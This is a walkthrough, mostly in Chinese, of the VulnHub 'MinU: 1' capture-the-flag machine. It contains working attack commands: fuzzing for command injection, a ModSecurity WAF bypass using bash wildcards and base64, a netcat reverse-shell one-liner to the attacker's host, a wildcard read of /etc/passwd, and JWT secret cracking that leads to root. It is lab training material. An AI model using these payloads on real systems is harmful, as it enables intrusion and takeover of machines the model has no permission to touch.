# MinU: 1

2024-4-27 https://www.vulnhub.com/entry/minu-1,235/

difficulty: easy/intermediate

vitrualbox open

## IP

192.168.5.13

## Scan

Open Port -> 80

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.27
```

只开放了一个 web 80 端口，直接开始访问主页，是一个 apache 的默认页面，没什么信息。

进行目录扫描，发现全部返回的 403。使用 nikto 进行扫描，发现 test.php 页面，继续进行访问发现：http://192.168.5.13/test.php?file=last.html 这个 file 参数可能存在文件包含漏洞，file=/var/log/wtmp 可以访问，但是/etc/passwd 又什么内容都没有，好像页面中有某种过滤，可能存在 WAF，wafw00f http://192.168.5.13/test.php ，根据返回结果，提示可能存在 WAF。

模糊测试下，能通过哪些绕过方法：

```
wfuzz -c --hc 403 -z file,/usr/share/wfuzz/wordlist/Injections/All_attack.txt http://192.168.5.13/test.php?file=FUZZ
```

看到 |dir 显示状态码 200，进行命令拼接：http://192.168.5.13/test.php?file=last.html|pwd 页面上显示了当前路径 /var/www/html ，说明能够进行命令执行。

继续尝试拼接其他命令，发现有些命令执行不了，应该是被 WAF 拦截了。

http://192.168.5.13/test.php?file=--version 后得到了 cat 的版本 (GNU coreutils) 8.26，猜测 web 代码可能是 `exec("cat ".'$_GET['file'])`，所以为了能执行反弹 shell，必须对攻击代码进行处理才能绕过 WAF。

在查询了相关资料后，发现这个 WAF 是 ModSecurity，所以直接寻找绕过这个 WAF 的相关方法。

发现了 2 个有用账户：

```
curl "http://192.168.5.13/test.php?file=/etc/pass\[w\]d"

root:x:0:0:root:/root:/bin/bash
bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
```

经过不断尝试后，找到了一种可以绕过 WAF 执行 RCE 的方法：

```
nc -e /bin/sh 192.168.5.10 333  --base64--> bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjUuMTAgMzMz  编码中不要带=号，否则会跟url中=号冲突

curl 'http://192.168.5.13/test.php?file=%26/bin/ech?%20bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjUuMTAgMzMz|/u?r/b?n/b?se64%20-d|/b?n/sh'
```

在 kali 上监听 333 端口，得到了反弹的 shell，先升级 tty，目标机器上没有 python，使用其他方式升级：script -qc /bin/bash /dev/null

先看看内核版本，是否能有可利用的内核漏洞：

```
uname -a
Linux MinU 4.13.0-39-generic #44-Ubuntu SMP Thu Apr 5 14:21:12 UTC 2018 i686 i686 i686 GNU/Linux
```

但是目标系统中没有 gcc 编译器，暂时不考虑这个攻击方向。

在 /home/bob 目录下发现了 `._pw_` 文件，像是 passwd 的缩写：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.pn55j1CFpcLjvReaqyJr0BPEMYUsBdoDxEPo6Ft9cwg
```

看内容像是 JWT，尝试去解码看看什么内容：

```
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}
```

但是我们没有相应的密钥，尝试能否对此 JWT 进行爆破，找到密钥，有可能密钥就是 bob 的用户密码。

```
git clone https://github.com/brendan-rius/c-jwt-cracker
sudo apt-get install libssl-dev
cd c-jwt-cracker
make
./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.pn55j1CFpcLjvReaqyJr0BPEMYUsBdoDxEPo6Ft9cwg
```

最终得到密钥：mlnV1。尝试切换到 bob，认证失败；尝试切换到 root，切换成功。

```
root@MinU:~# cat flag.txt cat flag.txt
cat flag.txt
  __  __ _       _    _      __
 |  \/  (_)     | |  | |    /_ |
 | \  / |_ _ __ | |  | |_   _| |
 | |\/| | | '_ \| |  | \ \ / / |
 | |  | | | | | | |__| |\ V /| |
 |_|  |_|_|_| |_|\____/  \_/ |_|


# You got r00t!

flag{c89031ac1b40954bb9a0589adcb6d174}

# You probably know this by now but the webserver on this challenge is
# protected by mod_security and the owasp crs 3.0 project on paranoia level 3.
# The webpage is so poorly coded that even this configuration can be bypassed
# by using the bash wildcard ? that allows mod_security to let the command through.
# At least that is how the challenge was designed ;)
# Let me know if you got here using another method!

# contact@8bitsec.io
# @_8bitsec
```
